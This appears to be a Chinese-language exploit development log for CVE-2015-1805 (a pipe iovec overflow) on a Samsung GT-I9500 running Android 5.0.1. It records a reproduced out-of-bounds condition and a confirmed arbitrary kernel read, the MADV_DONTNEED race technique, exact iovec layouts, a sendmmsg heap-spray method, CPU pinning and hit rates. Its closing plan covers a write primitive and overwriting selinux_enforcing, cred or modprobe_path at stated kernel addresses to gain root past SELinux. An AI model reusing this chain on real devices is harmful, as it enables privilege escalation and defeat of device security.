# P4.1 实测结果：越界成立 + 任意内核读成立

**时间**：2026-10-18
**设备**：GT-I9500 / Android 5.0.1 / I9500ZSSHQD1 / SELinux Enforcing / shell
**结论**：**CVE-2015-1805 在本机可利用。iovec 数组越界已实测复现，任意内核读已实测成功（读到 `linux_banner` = "Linux ve"）。**

---

## 1. 决定性证据

### 1.1 越界复现（OOB 目标 = 用户 canary）

```
[*] control (no toggle) ...
    writev ret=8192
[ctl] b0=aa b16=dd b4080=dd b4096=cc b8180=cc
[*] race start: max_iter=3000
[+] OOB iter=0 idx=257,258 val=dead000000000101,dead000000000102
[+] OOB iter=1 idx=259,260 val=dead000000000103,dead000000000104
[+] OOB iter=3 idx=261,262 val=dead000000000105,dead000000000106
```

- 管道最后 16 字节 = 残留 `iov[257]/[258]` 的 `iov_base` 指向的 `magic[257]/[258]`
- 每次命中后这两个条目的 `iov_len` 被 `-= 8` 归零，下一次自动前移到 `iov[259]/[260]` → **越界 iovec 确实被内核逐条消费**

### 1.2 任意内核读（OOB 目标 = `linux_banner @0xc06fd04c`）

```
[*] race start: max_iter=500
[?] full tail=65762078756e694c,65762078756e694c
[+] OOB iter=0 idx=26956,26956 val=65762078756e694c,65762078756e694c
```

`0x65762078756e694c` 小端 = `4c 69 6e 75 78 20 76 65` = **"Linux ve"** ——
内核从 `linux_banner` 读出 8 字节，经管道原样送到用户态。

**这条链上没有任何 infoleak、没有栈地址、没有厂商驱动、shell 直接可达。**

## 2. 两个决定成败的实测发现

### 2.1 内核 `copy_from_user` 读 PROT_NONE 页**不会**缺页

```
user read: SIGSEGV (expected)
write(pipe, protnone, 100) = 100 errno=0     ← 内核读成功，内容 0xDD
readv(pipe, protnone) = -1 errno=14          ← 内核写失败
```

本机 ARM `CONFIG_CPU_USE_DOMAINS` 下，监督态用域管理权限读用户页，
`mprotect(PROT_NONE)` 只挡住用户态和内核**写**，挡不住内核**读**。
→ **pipe_write 方向不能用 mprotect 制造故障，只有 munmap（去掉 VMA）才行。**

### 2.2 预取必然覆盖副本范围 → 只能抢「预取之后、拷贝之前」的窗口

- `pipe_write` 每轮 `iov_fault_in_pages_read(iov, chars)`（`c0105c18`）：读首/末字节
- `pipe_read` 的预取是内联的 `strb` 写 0（`c0105728`）：写首/末字节
- `chars <= 4096` → 单个 chunk 至多跨 2 页 → 首尾探测**必然全覆盖**
- 唯一漏洞是「chunk 跨 3 页」的中间页，但那要求 chunk = 4096 = 整轮 → **W = 0**

所以确定性故障不存在。但**只要在预取之后、拷贝之前把 PTE 清掉**，
拷贝必然缺页（`kmap_atomic` → `pagefault_disable` → `in_atomic()` →
`do_page_fault` 走 `no_context` → fixup → EFAULT），
而重试用的是可睡眠的 `kmap()`，VMA 还在 → **必然重新缺页进来、必然成功**。

→ 用 `madvise(MADV_DONTNEED)` 循环抢这个窗口：**只需要一次运气，不需要两次**。
这正是它比 munmap/mmap 竞态（还要赌重试落在 remap 之后）好用的原因。

## 3. 可用参数（实测）

| 项 | 值 |
|---|---|
| 方向 | `writev(pipe_w, iov, 257)`（pipe_write，任意读） |
| 数组 | `iov[0]={p0,16}`、`iov[1]={pR,4080}`、`iov[2]={p2,4096}`、`iov[3..256]={NULL,0}` |
| 总长 | 8192（2 个 pipe buffer） |
| 竞态线程 | CPU1，`madvise(pR, 4096, MADV_DONTNEED)` 死循环 |
| 写者 | CPU0，每 4 轮 `sendmmsg` 喷一次 kmalloc-4096 残留 |
| 越界量 | W = 16（`iov[0]` 整条完成，`iov[1]` 部分拷贝不回写） |
| 命中率 | **前 4 轮内 3 次命中**（`tog=187`） |

## 4. 副产品：`kmalloc-4096` 残留复用已验证

喷子 = `sendmmsg`（`msg_iovlen=512` + `msg_controllen=4096`），
`___sys_sendmsg` 里 `sock_kmalloc(4096)` → `verify_iovec` **裸拷 512 条 iovec**
（逐条不过 `access_ok`）→ 返回前 `sock_kfree_s(ctl)`、`sock_kfree_s(iov)`。
紧接着 `writev` 的 `kmalloc(2056)` 在同一个核上 LIFO 命中的就是这个对象，
后 2040 字节 = 我们的 `iov[257..511]`。实测 100% 命中。

## 5. 下一步

1. **写原语**：`pipe_read` 方向（`copy_to_user`）。本机 `copy_to_user` **会**被
   `PROT_NONE` 挡住，所以竞态从 `MADV_DONTNEED` 换成 `mprotect(NONE)/mprotect(RW)`
   （实测 3.95µs/周期，比 munmap 的 10.4µs 快）。
   注意 `pipe_read` 的 `atomic = !prefetch`：预取失败会直接走非原子路径、没有重试，
   所以窗口比读方向更窄。
2. 写原语通了之后：`selinux_enforcing`（`0xc0c4d490`）、`init_cred`/当前 cred，
   或 `modprobe_path`（`0xc0b9ec3c`）。
3. 收尾：`setenforce` 无用（`CONFIG_ALWAYS_ENFORCE`），必须直接改 `selinux_enforcing` 或走 cred 替换。
